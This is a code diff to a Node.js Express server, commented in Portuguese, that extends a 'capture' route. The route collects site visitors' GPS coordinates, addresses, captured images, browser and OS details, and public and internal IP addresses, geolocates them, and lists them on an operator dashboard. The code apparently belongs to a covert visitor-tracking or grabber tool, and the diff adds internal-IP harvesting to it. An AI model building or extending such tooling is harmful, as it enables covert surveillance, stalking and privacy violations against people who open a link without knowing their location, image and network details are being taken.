@@ -203,12 +203,11 @@ async function obterCepPorCoordenadas(lat, lon) {
     return 'Erro ao obter CEP';
   }
 }
-// ========== ROTA DE CAPTURA ==========
-// ========== ROTA DE CAPTURA MODIFICADA PARA USAR O IP DO FRONTEND ==========
+// ========== ROTA DE CAPTURA MODIFICADA PARA USAR O IP DO FRONTEND E RECEBER IPs INTERNOS ==========
 app.post('/dados', async (req, res) => {
-  // 1. Desestruture os dados recebidos, INCLUINDO 'ip'
-  const { latitude, longitude, endereco, imagem, sistema, navegador, ip: ipFrontend } = req.body;
-  console.log("Dados recebidos no /dados:", { latitude, longitude, endereco, sistema, navegador, ipFrontend }); // Log para debug
+  // 1. Desestruture os dados recebidos, INCLUINDO 'ip', 'ipv4Interno' e 'ipv6Interno'
+  const { latitude, longitude, endereco, imagem, sistema, navegador, ip: ipFrontend, ipv4Interno, ipv6Interno } = req.body;
+  console.log("Dados recebidos no /dados:", { latitude, longitude, endereco, sistema, navegador, ipFrontend, ipv4Interno, ipv6Interno }); // Log para debug
 
   let fileName = null;
   if (imagem) {
@@ -217,38 +216,14 @@ app.post('/dados', async (req, res) => {
       fs.mkdirSync(pastaCapturas, { recursive: true });
     }
     fileName = `captura_${Date.now()}.png`;
-    const base64Data = imagem.replace(/^data:image\/png;base64,/, '');
+    const base64Data = imagem.replace(/^data:image\/png;base64,/, ''); // Corrigido o prefixo
     const caminhoImagem = path.join(pastaCapturas, fileName);
     fs.writeFileSync(caminhoImagem, base64Data, 'base64');
   }
 
   // 2. Inicialize as variáveis de IP
   let ipFinal = 'IP não informado';
-  let dadosIP = {
-    ipOriginal: 'Não utilizado',
-    ipPublico: 'Não utilizado',
-    ipPublicoOperadora: 'Não utilizado',
-    ipPublicoIPv4Real: 'IP não informado',
-    ipv4: 'Não detectado',
-    ipv6: 'Não detectado',
-    ehIPPrivado: null,
-    geolocalizacao: {
-      pais: 'Não informado',
-      codigoPais: 'N/A',
-      estado: 'Não informado',
-      cidade: 'Não informado',
-      cep: 'Não informado',
-      latitude: null,
-      longitude: null,
-      timezone: 'Não informado'
-    },
-    provedor: {
-      isp: 'Desconhecido',
-      organizacao: 'Desconhecida',
-      sistemaAutonomo: 'Não informado'
-    },
-    todosIPs: {}
-  };
+  let dadosGeoIP = {}; // Para armazenar os dados de geolocalização
 
   // 3. Validar o IP capturado pelo frontend
   const ipFrontendValido = ipFrontend &&
@@ -262,15 +237,15 @@ app.post('/dados', async (req, res) => {
     try {
         const geoServicos = [
           `http://ip-api.com/json/${ipFrontend}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`
-          // Adicionei apenas um serviço por simplicidade e velocidade. Você pode adicionar mais se quiser.
+          // Adicionado apenas um serviço primário por simplicidade. Você pode adicionar mais se quiser.
         ];
-        let dadosGeoIP = {};
         let geoSucesso = false;
         for (const servicoGeo of geoServicos) {
           try {
             console.log(`🔍 Tentando geolocalizar IP ${ipFrontend} via ${servicoGeo}...`);
-            const geoResponse = await axios.get(servicoGeo, { timeout: 8000 });
-            if (geoResponse.data.status === 'success' && geoResponse.data.country) {
+            const geoResponse = await axios.get(servicoGeo, { timeout: 10000 }); // Timeout um pouco maior
+            // Verificação mais explícita do sucesso
+            if (geoResponse.data && geoResponse.data.status === 'success' && geoResponse.data.country) {
               dadosGeoIP = {
                 country: geoResponse.data.country,
                 countryCode: geoResponse.data.countryCode,
@@ -289,66 +264,67 @@ app.post('/dados', async (req, res) => {
               geoSucesso = true;
               break; // Sai do loop se obteve sucesso
             } else {
-                console.log(`⚠️ Resposta inválida de ${servicoGeo}:`, geoResponse.data);
+                console.log(`⚠️ Resposta inválida ou falha de ${servicoGeo}:`, geoResponse?.data || 'Sem dados');
             }
           } catch (geoErr) {
              console.log(`⚠️ Erro na geolocalização via ${servicoGeo}:`, geoErr.message);
           }
         }
 
-        if (geoSucesso) {
-            // Atualiza os campos relevantes no objeto dadosIP para o registro
-            dadosIP.geolocalizacao = {
-                pais: dadosGeoIP.country || 'Não informado',
-                codigoPais: dadosGeoIP.countryCode || 'N/A',
-                estado: dadosGeoIP.regionName || 'Não informado',
-                cidade: dadosGeoIP.city || 'Não informado',
-                cep: dadosGeoIP.zip || 'Não informado',
-                latitude: dadosGeoIP.lat || null,
-                longitude: dadosGeoIP.lon || null,
-                timezone: dadosGeoIP.timezone || 'Não informado'
-            };
-            dadosIP.provedor = {
-                isp: dadosGeoIP.isp || 'Desconhecido',
-                organizacao: dadosGeoIP.org || 'Desconhecida',
-                sistemaAutonomo: dadosGeoIP.as || 'Não informado'
-            };
-        } else {
+        if (!geoSucesso) {
              console.log(`⚠️ Não foi possível obter geolocalização para o IP ${ipFrontend}.`);
         }
-        // Atualiza os campos principais de IP
-        dadosIP.ipPublicoIPv4Real = ipFrontend;
-        dadosIP.ipPublico = ipFrontend;
-        dadosIP.ipPublicoOperadora = ipFrontend;
-        dadosIP.ipv4 = ipFrontend; // Assume que é IPv4
+        // Se não obteve geoloc, os campos em dadosGeoIP ficarão undefined/vazios
 
     } catch (updateErr) {
-        console.error("💥 Erro ao atualizar dados com IP do frontend:", updateErr);
-        // Mesmo se falhar na geoloc, ainda usa o IP
-        dadosIP.ipPublicoIPv4Real = ipFrontend;
-        dadosIP.ipPublico = ipFrontend;
-        dadosIP.ipPublicoOperadora = ipFrontend;
-        dadosIP.ipv4 = ipFrontend;
+        console.error("💥 Erro ao tentar obter dados com IP do frontend:", updateErr);
+        // Continua, mas sem dados de geoloc
     }
   } else {
-    console.log(`⚠️ IP do frontend inválido ou não enviado: '${ipFrontend}'.`);
+    console.log(`⚠️ IP do frontend inválido ou não enviado: '${ipFrontend}'. Tentando método do servidor...`);
     // Fallback: tenta usar o IP do servidor/proxy (método antigo)
-    console.log("🔄 Tentando obter IP via cabeçalhos do servidor...");
-    const dadosIPServidor = await obterIPPublicoReal(req);
-    ipFinal = dadosIPServidor.ipPublicoIPv4Real;
-    if (ipFinal && ipFinal !== 'Não disponível' && ipFinal !== 'Erro') {
-        console.log(`✅ Usando IP obtido pelo servidor: ${ipFinal}`);
-        // Reutiliza os dados obtidos pela função original
-        dadosIP = dadosIPServidor;
-    } else {
-        console.log("❌ Nenhum IP válido encontrado.");
-        ipFinal = 'Erro ao determinar IP';
+    try {
+        console.log("🔄 Tentando obter IP via cabeçalhos do servidor...");
+        const dadosIPServidor = await obterIPPublicoReal(req);
+        const ipFromServer = dadosIPServidor.ipPublicoIPv4Real;
+        if (ipFromServer && ipFromServer !== 'Não disponível' && ipFromServer !== 'Erro') {
+            console.log(`✅ Usando IP obtido pelo servidor: ${ipFromServer}`);
+            ipFinal = ipFromServer;
+            // Reutiliza os dados de geoloc obtidos pela função original, se disponíveis
+            dadosGeoIP = dadosIPServidor.geolocalizacao || {};
+        } else {
+            console.log("❌ Nenhum IP válido encontrado pelo servidor.");
+        }
+    } catch (serverIpErr) {
+        console.error("💥 Erro ao obter IP pelo servidor:", serverIpErr);
     }
   }
 
+  // Valores padrão para geolocalização caso não seja obtida
+  const geolocFinal = {
+    pais: dadosGeoIP.country || 'Não informado',
+    codigoPais: dadosGeoIP.countryCode || 'N/A',
+    estado: dadosGeoIP.regionName || 'Não informado',
+    cidade: dadosGeoIP.city || 'Não informado',
+    cep: dadosGeoIP.zip || 'Não informado',
+    latitude: dadosGeoIP.lat || null,
+    longitude: dadosGeoIP.lon || null,
+    timezone: dadosGeoIP.timezone || 'Não informado'
+  };
+
+  const provedorFinal = {
+    isp: dadosGeoIP.isp || 'Desconhecido',
+    organizacao: dadosGeoIP.org || 'Desconhecida',
+    sistemaAutonomo: dadosGeoIP.as || 'Não informado'
+  };
+
   let cepGPS = 'Não informado';
   if (latitude && longitude) {
-    cepGPS = await obterCepPorCoordenadas(latitude, longitude);
+    try {
+        cepGPS = await obterCepPorCoordenadas(latitude, longitude);
+    } catch (cepErr) {
+        console.error("Erro ao obter CEP via GPS:", cepErr);
+    }
   }
 
   const registro = {
@@ -359,32 +335,39 @@ app.post('/dados', async (req, res) => {
     navegador,
     imagem: fileName,
     horario: new Date().toLocaleString(),
-    // Usando os valores potencialmente atualizados
-    ipOriginal: dadosIP.ipOriginal,
-    ipPublico: dadosIP.ipPublico,
-    ipPublicoOperadora: dadosIP.ipPublicoOperadora,
-    ipPublicoIPv4Real: dadosIP.ipPublicoIPv4Real, // <- Este é o campo crucial
-    ipv4: dadosIP.ipv4,
-    ipv6: dadosIP.ipv6,
-    ehIPPrivado: dadosIP.ehIPPrivado,
-    pais: dadosIP.geolocalizacao.pais,
-    codigoPais: dadosIP.geolocalizacao.codigoPais,
-    estado: dadosIP.geolocalizacao.estado,
-    cidade: dadosIP.geolocalizacao.cidade,
-    cep: dadosIP.geolocalizacao.cep,
-    latitudeIP: dadosIP.geolocalizacao.latitude,
-    longitudeIP: dadosIP.geolocalizacao.longitude,
-    timezone: dadosIP.geolocalizacao.timezone,
-    operadora: dadosIP.provedor.isp,
-    organizacao: dadosIP.provedor.organizacao,
-    sistemaAutonomo: dadosIP.provedor.sistemaAutonomo,
-    todosIPs: dadosIP.todosIPs,
+    // Campos de IP
+    ipOriginal: 'Não utilizado diretamente', // O IP original do req ainda pode estar nos 'todosIPs' se for relevante
+    ipPublico: ipFinal, // Este é o IP principal que queremos mostrar
+    ipPublicoOperadora: ipFinal, // Usado para geoloc
+    ipPublicoIPv4Real: ipFinal, // <- Este é o campo CRUCIAL para o dashboard
+    ipv4: ipFinal, // Assume que é IPv4
+    ipv6: 'Não detectado', // Se o frontend mandou IPv4, o IPv6 não é relevante aqui
+    ehIPPrivado: null, // Pode ser calculado se necessário, mas não é o foco
+    // Geolocalização baseada no IP
+    pais: geolocFinal.pais,
+    codigoPais: geolocFinal.codigoPais,
+    estado: geolocFinal.estado,
+    cidade: geolocFinal.cidade,
+    cep: geolocFinal.cep,
+    latitudeIP: geolocFinal.latitude,
+    longitudeIP: geolocFinal.longitude,
+    timezone: geolocFinal.timezone,
+    // Provedor baseado no IP
+    operadora: provedorFinal.isp,
+    organizacao: provedorFinal.organizacao,
+    sistemaAutonomo: provedorFinal.sistemaAutonomo,
+    // Outros
+    todosIPs: {}, // Pode ser preenchido se quiser manter os IPs originais do req
     cepGPS,
-    ipFrontendCapturado: ipFrontend // Para debug
+    ipFrontendCapturado: ipFrontend, // Para debug
+    // --- NOVOS CAMPOS PARA IP INTERNO ---
+    ipv4InternoVisitante: ipv4Interno || 'Não informado pelo cliente',
+    ipv6InternoVisitante: ipv6Interno || 'Não informado pelo cliente'
+    // -----------------------------------
   };
 
   dadosRecebidos.push(registro);
-  console.log(`✅ Registro salvo para IP: ${registro.ipPublicoIPv4Real}`); // Log para confirmar
+  console.log(`✅ Registro salvo para IP Final: ${registro.ipPublicoIPv4Real}`); // Log para confirmar
   res.send('Dados recebidos com sucesso!');
 });
 // ========== ROTA DE ACESSO VIA INDEX ==========
@@ -796,8 +779,11 @@ app.get('/dashboard', autenticar, (req, res) => {
                 <div class="info"><strong>Endereço GPS:</strong> \${dado.endereco || 'Não informado'}</div>
                 <div class="info"><strong>Coordenadas GPS:</strong> \${(dado.latitude && dado.longitude) ? dado.latitude + ', ' + dado.longitude : 'Não disponível'}</div>
                 <div class="info"><strong>CEP (GPS):</strong> \${dado.cepGPS || 'Não informado'}</div>
-                <div class="info"><strong>IPv4 do Visitante:</strong> \${dado.ipv4 || 'Não detectado'}</div>
-                <div class="info"><strong>IPv6 do Visitante:</strong> \${dado.ipv6 || 'Não detectado'}</div>
+                <div class="info"><strong>IP Público IPv4 (Real):</strong> <span style="color: #00d4ff; font-weight: 700;">\${dado.ipPublicoIPv4Real || 'Não disponível'}</span></div>
+                <!-- NOVOS CAMPOS -->
+                <div class="info"><strong>IP Interno IPv4 do Visitante:</strong> \${dado.ipv4InternoVisitante || 'Não informado pelo cliente'}</div>
+                <div class="info"><strong>IP Interno IPv6 do Visitante:</strong> \${dado.ipv6InternoVisitante || 'Não informado pelo cliente'}</div>
+                <!----------------->
               </div>
             \` : ''}
             \${dado.imagem ? \`
